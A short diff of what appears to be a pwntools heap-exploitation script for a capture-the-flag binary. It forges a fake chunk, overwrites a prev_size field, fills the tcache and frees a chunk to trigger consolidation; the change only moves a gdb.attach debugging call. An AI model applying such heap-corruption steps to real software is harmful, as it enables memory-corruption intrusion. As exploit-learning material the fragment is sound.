@@ -34,9 +34,11 @@ p.sendline("malloc 3 248") # chunk c
 p.sendline("read_copy 1")
 p.sendline(p64(0) + p64(0x60) + p64(chunk_addr) + p64(chunk_addr))
 
+
+
 p.sendline("read_copy 2")
 p.sendline(b'A' * 0x20 + p64(0x60))
-gdb.attach(p, s)
+
 
 # filling up tcache so that it goes into unsortedbin
 for i in range(4, 11):
@@ -47,6 +49,7 @@ for i in range(4, 11):
 
 
 # freeing chunk C and it starts to consolidate now!
+gdb.attach(p, s)
 p.sendline("free 3")
 
 # malloc(0x158) to get the chunk, we call this the chunk D
